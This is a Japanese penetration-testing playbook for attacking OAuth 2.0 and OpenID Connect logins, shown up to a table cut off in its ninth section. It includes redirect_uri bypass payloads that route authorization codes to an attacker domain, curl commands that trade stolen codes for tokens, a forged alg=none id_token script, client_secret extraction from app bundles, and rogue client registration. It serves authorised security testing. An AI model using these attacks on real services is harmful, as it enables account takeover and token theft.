# OAuth 2.0 / OpenID Connect 認証フロー攻撃

> **スコープ**: OAuth 2.0 / OpenID Connect (OIDC) で実装された認証・認可フローのバイパス・乗っ取り手法を扱う。client application 側の検証ミス（redirect_uri / state / scope / PKCE）と OIDC 固有の追加攻撃面（id_token 検証 / dynamic registration / request_uri）の両方をカバー。id_token 単体の偽造手順は `JWT_Attacks.md`、Open Redirect 経由の code 漏洩連鎖の詳細は `Open_Redirect.md`。

## 着火条件

OAuth / OIDC が使われているかを判定する。下表のシグナルを上から実施し、1 つでも該当すれば本ファイルを使う。**該当ゼロなら閉じてよい**（OAuth は使われていない or 攻撃面が無い）。

| シグナル | 確認方法 | 該当の意味 |
|---|---|---|
| `/.well-known/openid-configuration` が JSON を返す | `curl -s https://[TARGET]/.well-known/openid-configuration \| python3 -m json.tool` | OIDC 確定（§1〜§10 すべて検討） |
| `/.well-known/oauth-authorization-server` が JSON を返す | `curl -s https://[TARGET]/.well-known/oauth-authorization-server \| python3 -m json.tool` | OAuth 2.0 確定（OIDC 固有の §7 / §9 / §10 は対象外、それ以外検討） |
| `/oauth/authorize` `/oauth2/auth` `/connect/authorize` のいずれかが 302 / 400 / `missing parameter` を返す | `curl -sI https://[TARGET]/oauth/authorize`（他 URL も順次） | 認可エンドポイント存在 → 認可フロー実装あり |
| UI に「Login with Google / GitHub / Microsoft / Facebook / Apple」等のソーシャルログインボタンがある | ログインページを目視 | ソーシャルログイン経路あり（§6 含む） |
| ログイン後のリクエストに `Authorization: Bearer eyJ...` が含まれる | Burp HTTP history で `Authorization: Bearer ey` を検索 | OIDC id_token / OAuth access token 使用中 |
| アカウント設定画面に「外部 IdP 連携」「Connect with X」UI がある | UI 目視 | アカウント連携機能あり（§2 攻撃シナリオが成立する環境） |

いずれも該当しない場合は閉じてよい。トークンベース認証だが OAuth ではない（独自セッショントークン・JWT 単体）場合は `JWT_Attacks.md` へ。Cookie ベースなら `XSS.md`（Cookie 窃取）/ `IDOR.md` を検討。

## 環境前提

- 実行環境: テスター端末（被害者ブラウザのシミュレートには別プロファイルの Chrome / Firefox を使う）
- 必要なツール:
  - Burp Suite（要インストール / OAuth フロー全体のトレースに必須、Community でも JWT Editor 拡張で id_token 操作可）
  - `python3` + `PyJWT`（`pip3 install pyjwt cryptography`、id_token の手動検証・偽造に使用）
  - `jwt_tool`（要インストール: `git clone https://github.com/ticarpi/jwt_tool`、id_token 検証バイパスは `JWT_Attacks.md` と同手順）
  - 攻撃者制御の HTTP サーバ（`python3 -m http.server` または Burp Collaborator）
  - 攻撃者制御のドメイン（redirect_uri バイパス・JWKS 公開先として。テスト時は無料 DDNS / ngrok / Burp Collaborator でも可）
- オフライン代替: `python3` 標準ライブラリで authorization URL の組み立て・コールバック受信が可能

## 先に確認すること

着火条件で OAuth/OIDC 使用を確定したら、**どの攻撃パターンを試すか**を選ぶための深掘り観察を 4 ステップで行う。

### 深掘り 1：`.well-known` JSON の重要フィールドを読む

`.well-known/openid-configuration` の JSON から、攻撃面の全体像を読み取る:

| JSON フィールド | 攻撃で使う場面 |
|---|---|
| `issuer` | §7 の `iss` 検証バイパスの正規 issuer 名 |
| `authorization_endpoint` | §1 / §10 の試行先 |
| `token_endpoint` | §1 で奪った code をアクセストークンに交換する先 |
| `userinfo_endpoint` | §4 implicit flow scope upgrade の試行先 |
| `jwks_uri` | §7 の id_token 検証で client が参照する**正規 IdP の公開鍵セット URL**（discovery メタデータ経由）。攻撃面は「discovery JSON が改ざんできるか」「クライアントがどのキーを fetch して trust するか」。**JWT ヘッダ内の `jku` クレーム差し替え攻撃とは別経路**（後者は `JWT_Attacks.md` §6 で扱う JWT 単体の問題で、ヘッダ内 URL を信用してしまう実装に対するもの） |
| `registration_endpoint` | §9 動的クライアント登録の試行先（OIDC RFC 7591） |
| `request_uri_parameter_supported` / `request_object_signing_alg_values_supported` | §10 request_uri 経由の試行可否 |
| `device_authorization_endpoint` | §11 device code phishing の試行先（RFC 8628、Microsoft / GitHub / Google が対応） |
| `code_challenge_methods_supported` | §5 で `plain` が含まれていれば PKCE downgrade 可 |
| `response_types_supported` | §3 で `token` `id_token token` が含まれていれば Implicit Flow 利用可 |
| `scopes_supported` | §4 scope upgrade の標的 scope リスト |

> **ヒント:** discovery JSON は attack 設計の地図そのもの。パターン横断で参照するため**全体を保存しておく**こと。管理用 OIDC で `Authorization: Bearer` 必須のケースは認証情報も併せて準備する。すべて 404 / 403 なら本ファイルは閉じてよい（OAuth/OIDC 未使用 or 隠蔽）。

### 深掘り 2：正規ログインを Burp で 1 回通して観察

「Login with X」を 1 回押して HTTP history をキャプチャ。authorization request の URL（`accounts.google.com/o/oauth2/v2/auth?...` 等）から以下を読み取る:

| 観察項目 | 判定内容 → 関連ブロック |
|---|---|
| `response_type=` の値 | `code` → §1-§2 / `token` → §3 / `code id_token` → §7 |
| `redirect_uri=` の値 | §1 の攻撃対象（バリデーション強度を §1 試行で確認） |
| `state=` の有無 / random 性 | 無い / 固定値 → §2 成立 |
| `code_challenge=` の有無 | 無い → §5 成立 |
| `code_challenge_method=` の値 | `plain` → §5 downgrade 成立 |
| `nonce=` の有無（OIDC） | 無い → §7 でリプレイ攻撃成立 |
| `scope=` の値 | 取得した scope リスト → §4 で additional scope を試す |

### 深掘り 3：UI / DevTools で攻撃面を増やす

| 目視対象 | 何を判定するか → 関連ブロック |
|---|---|
| 同じ email で複数 IdP からログインできるか試す | §6（email 一致紐付け実装）の判定 |
| DevTools → Application → Local Storage / Cookie の `id_token` `access_token` | JWT 攻撃面の有無（`JWT_Attacks.md` 経由 / §7） |
| モバイル app / SPA の場合: JS バンドル / APK の strings 内に client_secret らしき値があるか | §8（client_secret 漏洩）の判定 |

### 深掘り 4：redirect_uri 登録方式の判定（§1 前段）

完全一致 / プレフィックス / 正規表現 のどれかは、authorize に異なる redirect_uri を渡したときのレスポンスで判定する:

| 試行値 | 返り方 | 判定 |
|---|---|---|
| `redirect_uri=https://[VICTIM_DOMAIN]/callback/extra` | 400 `invalid redirect_uri` | 完全一致（厳格） |
| 同上 | 200 / 302 | プレフィックスマッチ → §1.1 / §1.2 試行可 |
| `redirect_uri=https://[VICTIM_DOMAIN]/callback%2f@evil.com` | 200 / 302 | URL parse 不一致あり → §1.2 試行可 |
| `redirect_uri=https://[VICTIM_DOMAIN].evil.com/` | 200 / 302 | サブドメイン許容 → §1.1 試行可 |

**攻撃者の思考トレース:** OAuth は「複数当事者（user / client / authorization server / resource server）」の間でトークンが受け渡される設計のため、**どこか一箇所でも相手を信頼しすぎている検証スキップ**があればトークンを横取り・偽造・流用できる。単発のペイロードでは何も起きないが、フロー全体を俯瞰した「経路」を組み立てるとアカウント乗っ取りに直結する。Basic な検証ミス（redirect_uri / state）から順に試し、それで通らなければ scope / PKCE / 連携の信頼境界・id_token 検証・OIDC 固有面へ進む。

**攻撃クラスとチェーンで得るもの（全体図）:**

| 攻撃クラス | 単発の症状 | チェーンで攻撃者が得るもの |
|---|---|---|
| redirect_uri バイパス（§1） | 任意 URL に `?code=...` がリダイレクト | 被害者の authorization code を奪取 → トークン交換 → **被害者アカウント完全乗っ取り** |
| state 欠落 / CSRF（§2） | 被害者のブラウザで攻撃者の code が処理される | 被害者の既存アカウントに **攻撃者のソーシャル ID が連携** → 攻撃者の Google ログインで被害者アカウントに入れる |
| Implicit Token Leak（§3） | URL fragment の access_token | Referer / proxy log / ブラウザ履歴経由で漏洩 → **被害者なりすまし** |
| Scope upgrade（§4） | token endpoint / userinfo に追加 scope を通せる | 元々 user の同意のない scope のリソースに到達 → **データ取得範囲の拡大** |
| PKCE 欠落（§5） | 認可コードを横取りされても通常は使えない → 使える | code interception 攻撃が成立（モバイル app / public client で深刻） |
| email / sub 信頼性（§6） | 攻撃者制御 IdP で `email=victim@example.com` の id_token を発行 | email 紐付けで **被害者アカウント乗っ取り** |
| id_token 検証バイパス（§7） | 任意 sub の id_token を受け入れる | **任意アカウントへの認証バイパス** |
| client_secret 漏洩（§8） | 攻撃者が confidential client になりすませる | サーバ側 API を直接叩いて任意ユーザのトークン取得 / scope 拡大 |
| Dynamic Client Registration の悪用（§9） | 攻撃者制御 redirect_uri を持つ client を登録できる | victim 同意経路を経た **code 横取り** |
| request_uri SSRF（§10） | authorize 時に外部 URL を fetch させる | 認可サーバ内部ネット到達 / メタデータ取得 |
| Device Code Phishing（§11） | 攻撃者が device_code 経路でセッションを開始し被害者に user_code を入力させる | 被害者の Microsoft / GitHub / Google アカウントの **access + refresh token 取得**（refresh で長期持続化） |

---

## 1. redirect_uri 検証バイパス

**前提:** authorization server が `redirect_uri` の検証を完全一致以外（プレフィックス・サブストリング・正規表現）で行っている、または検証が緩い場合に成立。code を攻撃者ドメインへリダイレクトさせて奪取するのが目的。

**事前準備（必須）:**

1. 攻撃者制御のドメイン / IP を用意し、code を受信するエンドポイントを用意する
2. リスナー起動方法と到達可能 IP の確認は `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）参照

```bash
# [Attacker] code 受信用 HTTP リスナー
python3 -m http.server 8080
# Burp Collaborator でも可
```

### 1.1 サブドメインバイパス（プレフィックス / サブストリングマッチ）

```
# 正規の authorization request
https://[AUTH_SERVER]/oauth/authorize?
  response_type=code&
  client_id=[CLIENT_ID]&
  redirect_uri=https://[VICTIM_DOMAIN]/callback&
  scope=openid+email&
  state=[RANDOM]

# [Attacker] redirect_uri を以下のように変える
redirect_uri=https://[VICTIM_DOMAIN].[ATTACKER_DOMAIN]/callback
# 「victim.com で始まるなら OK」のような検証で通る
```

### 1.2 Path Traversal / userinfo / open redirect 連鎖

```
# [Attacker] パストラバーサルでホスト名を維持しつつパスを操作
redirect_uri=https://[VICTIM_DOMAIN]/callback/../../@[ATTACKER_DOMAIN]/
# URL parser によっては @ 以降がホストとして解釈される

# [Attacker] userinfo (@) 部分を使ったホスト乗っ取り
redirect_uri=https://[ATTACKER_DOMAIN]%23@[VICTIM_DOMAIN]/callback
# # (URL エンコード %23) でフラグメント分断、parser バグで attacker.com が host になるケース

# [Attacker] victim 側に open redirect がある場合の連鎖
redirect_uri=https://[VICTIM_DOMAIN]/redirect?next=https://[ATTACKER_DOMAIN]
# code は一度 victim に届くが、即座に Location ヘッダで attacker に転送される
# Referer ヘッダ経由でも code が漏れる（詳細は Open_Redirect.md と併読）
```

### 1.3 パラメータ汚染（HTTP Parameter Pollution）

```
# [Attacker] redirect_uri を 2 つ送る
redirect_uri=https://[VICTIM_DOMAIN]/callback&redirect_uri=https://[ATTACKER_DOMAIN]/
# 検証は最初の値・実際のリダイレクトは最後の値、を見る実装で成立
```

### 1.4 ホスト部の異なる表記

```
# [Attacker] 大文字小文字・末尾ドット・IDN homograph 混入
redirect_uri=https://VICTIM_DOMAIN.com/callback        # 大文字
redirect_uri=https://[VICTIM_DOMAIN]./callback         # 末尾ドット
# IDN homograph: ASCII の lookalike を Unicode 文字で置き換える
# 例: ascii 'a' (U+0061) → キリル文字 'а' (U+0430)・ascii 'o' → キリル 'о' (U+043E)
# 検証が文字列一致だけだと素通り、実 DNS resolve は攻撃者ドメイン（Punycode の xn-- 表記でも可）
redirect_uri=https://[VICTIM_DOMAIN_WITH_CYRILLIC_LOOKALIKE]/callback
redirect_uri=https://xn--[ATTACKER_PUNYCODE]/callback
```

### 奪取した code をアクセストークンに交換

```bash
# [Attacker] code → access_token 交換
curl -X POST https://[AUTH_SERVER]/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=[STOLEN_CODE]" \
  -d "redirect_uri=https://[VICTIM_DOMAIN]/callback" \
  -d "client_id=[CLIENT_ID]" \
  -d "client_secret=[CLIENT_SECRET_IF_CONFIDENTIAL]"
# redirect_uri は authorize 時と完全一致が必要（バイパスした値ではなく元の値）
# public client（client_secret 不要）の場合は client_secret パラメータを省略
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 + `access_token` 返却 | code 交換成功 | 被害者リソースエンドポイント（`/api/me` 等）で被害者情報が返れば乗っ取り成立 |
| 400 `invalid_grant` | code 既に消費済み / redirect_uri 不一致 | 被害者が踏むタイミングを調整、redirect_uri を authorize 時と完全一致に揃え直す |
| 認可レスポンスで `invalid_request` | redirect_uri バイパス自体が拒否 | 別バリエーション（2.1 → 2.2 → 2.3 → 2.4）を試す |
| 認可レスポンスで `access_denied` | user の同意が必要 | victim を踏ませる経路（XSS / 直接リンク / SNS）を準備 |

**注意:** redirect_uri バイパスは大手 IdP / 関連サービスでも繰り返し報告されている古典的問題（SharePoint の `appredirect.aspx` の `redirect_uri` パラメータバイパス `CVE-2020-1323`（Detectify Crowdsource 報告、`https://whitelisteddomain.com#@maliciousdomain.com` 型のペイロード）、Azure AD の redirect URI 検証ミス `CVE-2020-26878` 等）。**完全一致検証以外は基本的に何らかのバイパス余地がある**前提でバリエーションを総当たりするのが定石。code 1 回消費の制約があるため、被害者が踏むタイミングを管理する必要がある。

---

## 2. state 欠落・固定による OAuth CSRF（アカウント連携乗っ取り）

**前提:** authorization request に `state` パラメータが含まれない、または含まれていてもコールバック側で検証されていない場合に成立。

**攻撃シナリオ:** 「Google アカウントで連携」機能で、被害者の既存ローカルアカウントに**攻撃者の Google ID を紐付ける**。以降、攻撃者は自分の Google ログインで被害者アカウントに入れる。

**手順:**

1. 攻撃者が自分の Google で `/oauth/authorize` → `code` を取得（コールバックを止めて code を保存）
2. その code を含む callback URL を被害者に踏ませる（XSS / SNS / 直接送信）
3. 被害者のセッション cookie がついた状態で `/oauth/callback?code=[ATTACKER_CODE]` がアプリに届く
4. アプリは「ログイン済みユーザ（被害者）に Google ID を連携」処理を実行
5. 攻撃者の Google ログイン → 被害者アカウントに入れる

**コマンド:**

```
# [Attacker] 被害者に踏ませる URL
https://[VICTIM_APP]/oauth/callback?code=[ATTACKER_CODE]&state=
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 被害者画面に「Google 連携完了」表示 | アカウント連携乗っ取り成立 | 攻撃者の Google でログインし、被害者アカウントの表示を確認 |
| state 欠落でも 400 が返る | session-bound nonce で検証されている | 同じセッション内での race condition / 別タブからの authorize 起動を試す |
| state が固定値（毎回同じ） | 検証はあるが固定 → 実質 CSRF | 同じ state でも CSRF 成立、上記手順で実施 |
| state が暗号化された予測可能値 | エンコード方式によっては再利用可能 | 自分の session で取得した state を流用試行 |

**注意:** `state` は OAuth 2.0 spec (RFC 6749 §10.12) で CSRF 防止用に推奨されているが、必須ではない。OIDC では `nonce` (id_token 内) が同等の役割を担うが、`nonce` は id_token 検証時にしかチェックされない設計のため、code grant では `state` の代替にならない。

---

## 3. Implicit Flow Token Leakage

**前提:** access_token / id_token が URL fragment (`#access_token=...`) として返される実装の場合。**response_type の正確な区別:**

| `response_type` | 仕様 | 返却物 | 追加必須 |
|---|---|---|---|
| `token` | OAuth 2.0 implicit（RFC 6749 §4.2、RFC 9700 で非推奨）| `access_token` のみ | なし |
| `id_token` | OIDC implicit | `id_token` のみ | `scope=openid` + `nonce` |
| `id_token token` | OIDC hybrid 相当（implicit 系の組合せ）| `access_token` + `id_token` | `scope=openid` + `nonce` |
| `code token` / `code id_token` / `code id_token token` | OIDC hybrid flow（OIDC Core §3.3）| `code` + fragment 返却物 | `id_token` を含む場合は `scope=openid` + `nonce` |

`id_token` を含めるには **`scope=openid` 必須**かつ **`nonce` パラメータ必須**（OIDC Core §3.1.2.1）。これらが無い実装で `id_token` が返ってきたら**仕様違反**で別の attack 面のシグナル。

fragment はサーバに送信されないが、ブラウザ・Referer・JS 経由で漏洩する。

**観測点:**

```
# 認可レスポンスの形式（response_type=id_token token の場合）
https://[VICTIM_DOMAIN]/callback#access_token=[TOKEN]&id_token=[JWT]&token_type=bearer&expires_in=3600

# response_type=token (純粋 OAuth implicit) の場合
https://[VICTIM_DOMAIN]/callback#access_token=[TOKEN]&token_type=bearer&expires_in=3600
```

**コマンド:**

```bash
# [Attacker] callback ページのソースを確認し、location.hash を読み出している JS を特定
curl -s https://[VICTIM_DOMAIN]/callback | grep -iE "location\.hash|window\.location\.href"

# [Attacker] 外部リソースへの Referer に token が含まれていないか Burp で全件確認
# Burp HTTP history で Referer: にフィルター → access_token を grep
```

**漏洩経路 → 確認ポイント:**

| 経路 | 条件 | 検出方法 |
|---|---|---|
| Referer ヘッダ | callback ページから外部リソース読み込み + JS で `window.location.href` を外部送信している実装 | Burp の Referer 全件 grep で `access_token` を検索 |
| ブラウザ履歴 | 共有 PC・スクリーン共有・XSS で `history.entries` 取得 | XSS パターン併用（`XSS.md`） |
| 親フレーム経由 | iframe 内で OAuth フロー完結 + `postMessage` の origin チェックミス | iframe `src` の親フレーム origin を Burp で確認 |
| 開発者ツール由来 | analytics タグが `location.hash` を送信している実装 | callback ページの 3rd-party タグ列挙 |

**観測される出力 → 次のアクション:**

| 観測 | 示唆 | 次のアクション |
|---|---|---|
| 外部 URL への Referer に `#access_token=...` | fragment まで Referer に乗っている（ブラウザ実装ミス・古いブラウザ） | token を奪取して `/api/me` で被害者リソース確認 |
| JS が `location.hash` を analytics に POST | アプリ側で意図的に hash 送信 | 同上 |
| `postMessage` で trusted origin チェック無し | iframe 経由の token 漏洩 | 攻撃者 iframe を準備してメッセージ受信 |
| 漏洩経路無し | 設計上 implicit flow 漏洩なし | §4 scope upgrade or §7 id_token 検証へ |

**注意:** Implicit Flow は OAuth 2.0 Security BCP (RFC 9700) で**非推奨**となっており、新規実装では authorization code + PKCE が推奨。古いアプリで残存している場合に該当する攻撃面。fragment (`#`) はサーバログには残らないため、server-side ログだけで漏洩を確認しようとすると検出できない。

---

## 4. Scope 拡大（Scope Upgrade）

**前提:** authorization server / resource server が **scope の追加変更を検証していない**場合に成立。authorization code 交換時 / userinfo 呼び出し時に scope を増やして、user が同意していないリソースに到達する。

### 4.1 authorization code flow での scope upgrade

token 交換リクエストで `scope` を追加する:

```bash
# [Attacker] 元の authorize は scope=openid email だったが、code 交換時に追加
curl -X POST https://[AUTH_SERVER]/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=[CODE]" \
  -d "redirect_uri=https://[VICTIM_DOMAIN]/callback" \
  -d "client_id=[CLIENT_ID]" \
  -d "client_secret=[CLIENT_SECRET]" \
  -d "scope=openid email profile admin:read"
# 元 scope に無い admin:read を追加して通るか確認
```

### 4.2 implicit flow / 既存 token での scope upgrade

stolen access_token で userinfo に scope パラメータを追加する:

```bash
# [Attacker] userinfo endpoint へ追加 scope を引数で渡す
curl -H "Authorization: Bearer [STOLEN_TOKEN]" \
  "https://[AUTH_SERVER]/userinfo?scope=email+profile+address+phone"
# 元 token に紐付いていない scope の情報が返るか確認
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 + 追加 scope のリソースが返る | scope 検証なし | 高権限 scope（`admin:*` / `read:all` 等）に拡大、被害範囲を確認 |
| `access_token.scope` の値に追加 scope が含まれる | scope upgrade 成立 | 任意リソース API を叩いて影響評価 |
| 400 `invalid_scope` | scope 検証あり | 別 scope 名を試す（`scope_supported` から実装定義の scope を選ぶ） |
| 403 で scope 拡大不可 | リソース側で scope 検証あり | §1 redirect_uri バイパスで完全な再認可を試行 |

**注意:** OAuth 2.0 spec では「token 交換時の scope は authorize 時の scope のサブセットでなければならない」（RFC 6749 §6 refresh_token 文脈）が定められているが、authorization code flow での scope 追加については spec が曖昧。実装によっては「scope パラメータが付いていれば上書き」のような誤実装がある。`scopes_supported` のリストから高権限 scope を選ぶと効率が良い。

---

## 5. PKCE 欠落・downgrade

**前提:** authorization request に `code_challenge` パラメータが無い、または `code_challenge_method=plain`（実質 PKCE 無効）が許容される場合に成立。public client（モバイル app / SPA）では特に深刻。PKCE 本体の仕様は **RFC 7636**（Proof Key for Code Exchange、2015）で定義されており、当初は public client 向けだったが、後発の **OAuth 2.0 Security BCP（RFC 9700）** で confidential client にも PKCE を推奨するよう拡張された（authorization code injection 攻撃への防御として）。`code_challenge_method` は S256 必須・plain は本番では受け入れない実装が安全。

### 5.1 PKCE 欠落

```
# 正規リクエスト（PKCE 無し）
https://[AUTH_SERVER]/oauth/authorize?response_type=code&client_id=[CLIENT_ID]&redirect_uri=myapp://callback

# [Attacker] 同じ custom scheme を登録した悪意あるアプリで code 横取り
# → そのまま token endpoint へ送ってアクセストークン取得
curl -X POST https://[AUTH_SERVER]/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=[INTERCEPTED_CODE]" \
  -d "redirect_uri=myapp://callback" \
  -d "client_id=[CLIENT_ID]"
```

### 5.2 PKCE downgrade

`code_challenge_method=plain` を強制すると、`code_verifier=code_challenge` で通ってしまう:

```
# [Attacker] authorize 時に plain を指定
https://[AUTH_SERVER]/oauth/authorize?
  response_type=code&
  client_id=[CLIENT_ID]&
  redirect_uri=[REDIRECT]&
  code_challenge=[ANY_STRING]&
  code_challenge_method=plain

# code 横取り後、token 交換で code_verifier に同じ文字列を渡す
curl -X POST https://[AUTH_SERVER]/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=[INTERCEPTED_CODE]" \
  -d "redirect_uri=[REDIRECT]" \
  -d "client_id=[CLIENT_ID]" \
  -d "code_verifier=[SAME_STRING_AS_CHALLENGE]"
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 + access_token（PKCE 無しで通る） | PKCE 必須化されていない | code 横取り経路を準備（悪意ある同 scheme アプリ / 同 localhost ポート） |
| 200 + access_token（plain で通る） | PKCE downgrade 成立 | 同上 |
| 400 `code_challenge required` | PKCE 必須化済み | public client では順当な実装、confidential client 側の攻撃面に移行 |
| 400 `code_challenge_method must be S256` | downgrade 不可 | code 横取り単独では使えない、別経路へ |

**注意:** モバイル app の custom URL scheme は OS レベルで保証されない（同 scheme を登録した別 app が起動順序で先に受け取る可能性）。Universal Links / App Links を使った実装が推奨されているが、未対応のアプリも多い。

---

## 6. email / sub 信頼性攻撃（IdP 連携の信頼境界破り）

**前提:** ソーシャルログイン実装が「**email が一致したら既存のローカルアカウントと紐付ける**」設計で、かつ `email_verified` フラグを検証していない、または攻撃者が制御できる IdP（自己ホスト Keycloak / 独自 OIDC プロバイダ）が許容されている場合に成立。

### 6.1 攻撃シナリオ A: 複数 IdP 受け入れ環境（`email_verified` 不検証）

```
# [Attacker] 攻撃者が制御する IdP（または email 編集可能なソーシャル IdP）で
# email=victim@example.com の id_token を発行 → 標的アプリに送る
# 標的アプリは email で既存アカウントを引き → ログイン成立 → 被害者乗っ取り
```

### 6.2 攻撃シナリオ B: sub の使い回し誤解

`sub` は IdP 内でユニークだが、**IdP 間ではユニークではない**。複数 IdP を受け入れているアプリが sub だけで一意性を判定していると、別 IdP の同じ数値 sub を持つユーザが衝突する。

**確認手順:**

```bash
# [Attacker] 1. 標的アプリのソーシャルログイン対応 IdP を列挙
#                UI のボタン、または .well-known の issuers_supported
curl -s https://[TARGET]/.well-known/openid-configuration | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('issuers_supported', d.get('issuer')))"

# [Attacker] 2. 攻撃者制御 IdP で email=[VICTIM_EMAIL] email_verified=true の id_token を発行
#                Keycloak / 自前 OIDC server / nOAuth 型の email 変更を試す
```

**観測される出力 → 次のアクション:**

| 標的アプリの応答 | 示唆 | 次のアクション |
|---|---|---|
| 被害者ダッシュボードが表示 | email 紐付け成立 | 影響範囲確認 |
| `email_verified=false` で拒否 | email_verified 検証あり | 同 IdP 内で email 変更 + 再認証で `email_verified=true` を取り直せる IdP（一部の OIDC プロバイダ）を試す |
| 別 IdP の id_token で拒否 | `iss` 限定 | 受け入れ IdP リスト内で email 変更可能なものを探す |

**注意:** **nOAuth**（Descope 発見・2023）はこの類型の実例。Microsoft Azure AD マルチテナント OAuth アプリで email クレームが mutable かつ未検証であることを悪用し、攻撃者が自分の Azure AD アカウントの email を被害者のアドレスに変更することでアカウント乗っ取りが成立した。複数 tenant / 複数 IdP を受け入れる環境では `iss + sub` のペアで一意性を判定する必要がある。

---

## 7. id_token 検証バイパス（OIDC 固有）

**前提:** OpenID Connect 対応の認可サーバが返す `id_token`（JWT）の検証実装に不備がある場合に成立。詳細な署名バイパス手順は `JWT_Attacks.md` に委譲。本ブロックは OIDC 固有の追加検証項目（`iss` / `aud` / `azp` / `nonce`）の崩し方を扱う。

**OIDC 固有の検証項目（攻撃者視点）:**

| 検証項目 | スキップされている場合に攻撃者ができること |
|---|---|
| 署名検証（`alg`）| `JWT_Attacks.md` §2-§8 参照、id_token を任意の sub / email で偽造可能 |
| `iss`（発行者）| 攻撃者制御の認可サーバが発行した id_token を受け入れる |
| `aud`（対象クライアント）| 別 client_id 向けの id_token を流用 |
| `azp`（authorized party）| 同上、multi-tenant 環境で他テナント向けトークンを流用 |
| `nonce` | リプレイ攻撃成立 |
| `exp` | 有効期限切れトークンの再利用 |

**コマンド:**

```python
# [Attacker] id_token 偽造例（署名検証スキップ実装に対して）
import jwt, time
forged = jwt.encode({
    "iss": "https://[AUTH_SERVER]",   # 正規 issuer に偽装
    "sub": "[VICTIM_USER_ID]",        # 標的ユーザの sub
    "aud": "[CLIENT_ID]",
    "exp": int(time.time()) + 3600,
    "iat": int(time.time()),
    "nonce": "[NONCE_FROM_REQUEST]",  # authorization request の nonce を流用
    "email": "[VICTIM_EMAIL]",
    "email_verified": True            # §6 への布石
}, "", algorithm="none")
print(forged)
```

```bash
# [Attacker] jwt_tool で id_token 既知の弱点を一括スキャン
python3 jwt_tool.py [ID_TOKEN] -M at \
  -t https://[VICTIM_APP]/[ENDPOINT_THAT_VALIDATES_ID_TOKEN] \
  -rh "Authorization: Bearer [ID_TOKEN]"
```

**観測される出力 → 次のアクション:**

| 標的アプリの応答 | 示唆 | 次のアクション |
|---|---|---|
| 200 + 被害者として認証 | 検証スキップ成功 | 該当検証項目を report（aud / iss / azp / nonce / exp のどれか） |
| 401 `invalid signature` | 署名検証はあり | `JWT_Attacks.md` §5 jwk / §6 jku / §8 algorithm confusion へ |
| 401 `invalid issuer` | iss 検証あり | §6 で攻撃者制御 IdP の受け入れ可否を確認 |
| 401 `invalid audience` | aud 検証あり | multi-tenant 想定で異なる client_id を試す |
| 200 だが nonce ミスマッチで再認証要求 | nonce 検証あり | リプレイ単独では刺さらない、`nonce` を request 直近の値で再構成 |

**注意:** id_token は OIDC の「認証結果の証明」（JWT）であって、access_token とは別物。id_token は client が検証する、access_token は resource server が検証する。攻撃面が違う点を混同しない。

---

## 8. client_secret 漏洩悪用

**前提:** confidential client（client_secret を持つ）の secret が公開環境（モバイル app バンドル / SPA の JS / GitHub repo / モバイル app 復号後の strings）にハードコードされている場合に成立。

**コマンド:**

```bash
# [Attacker] モバイル app の場合
# Android: APK を apktool で展開し strings で grep
apktool d [APP].apk -o [OUT_DIR]
grep -rE "client[_-]?secret|[a-f0-9]{32,}" [OUT_DIR]/

# iOS: ipa を unzip し Mach-O の __TEXT,__cstring セクションを strings
unzip [APP].ipa -d [OUT_DIR]
strings [OUT_DIR]/Payload/[APP].app/[BINARY] | grep -iE "secret|client_id"

# SPA の場合
curl -s https://[VICTIM_DOMAIN]/static/js/main.*.js | grep -iE "client[_-]?secret|[a-f0-9]{32,}"
```

```bash
# [Attacker] GitHub 検索（authenticated search が必要）
# gh search code "client_secret org:[ORG_NAME]"

# [Attacker] 取得した client_secret で confidential client として token 交換
curl -X POST https://[AUTH_SERVER]/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=[CODE]" \
  -d "redirect_uri=[REDIRECT_URI]" \
  -d "client_id=[CLIENT_ID]" \
  -d "client_secret=[LEAKED_SECRET]"
```

**観測される出力 → 次のアクション:**

| 探索結果 / サーバ応答 | 示唆 | 次のアクション |
|---|---|---|
| APK / IPA / JS バンドル内に 32 桁 16 進数 + `client_secret` 文字列 | secret 漏洩 | confidential client として認証フロー実施可 |
| 200 + access_token + refresh_token | client 認証成立 | `grant_type=refresh_token` で長期アクセス維持可能 |
| 401 `invalid_client` | secret 違い / client_secret が rotate された | 別 hash 候補・別フォーマットを試す（base64 / hex / 生文字列） |
| 探索で何も見つからない | BFF (backend-for-frontend) パターン使用中 | BFF サーバ側の脆弱性 / SSRF に攻撃面を移す |

**注意:** confidential client の client_secret は本来サーバ間通信用で、クライアント端末（モバイル / SPA）に置く設計自体が誤り。public client（PKCE 必須）として再設計するのが正解だが、レガシーアプリで残存していることがある。**取得した secret は認証情報扱い**、暗号化保管・テスト完了時破棄が必須。

---

## 9. OIDC Dynamic Client Registration の悪用（Unprotected Dynamic Registration）

**前提:** OIDC Dynamic Client Registration エンドポイント（RFC 7591、`/connect/register` など）が**認証なしで開いている**場合に成立。攻撃者制御の redirect_uri を持つ新しい client を登録し、victim が同意した経路で code を奪う。

**事前準備（必須）:** 着火条件で取得した `.well-known/openid-configuration` JSON から `registration_endpoint` フィールドの URL を取得。

**コマンド:**

```bash
# [Attacker] 攻撃者制御 redirect_uri を持つ client を登録
curl -X POST https://[AUTH_SERVER]/connect/register \
  -H "Content-Type: application/json" \
  -d '{
    "redirect_uris": ["https://[ATTACKER_DOMAIN]/callback"],
    "client_name": "kedalab-[CASE_ID]-test",
    "token_endpoint_auth_method": "none"
  }'
# 200 + JSON { "client_id": "...", "client_secret": "..." } が返れば登録成立

# [Attacker] 取得した client_id で victim を authorize ページへ誘導
# https://[AUTH_SERVER]/oauth/authorize?
#   response_type=code&
#   client_id=[NEWLY_REGISTERED_CLIENT_ID]&
#   redirect_uri=https://[ATTACKER_DOMAIN]/callback&
#   scope=openid+email+profile
# victim が同意すると attacker.com に code が届く → §1 同様 token 交換
```

**観測される出力 → 次のアクション:**

| サーバの応答 | 示唆 | 次のアクション |
|---|---|---|
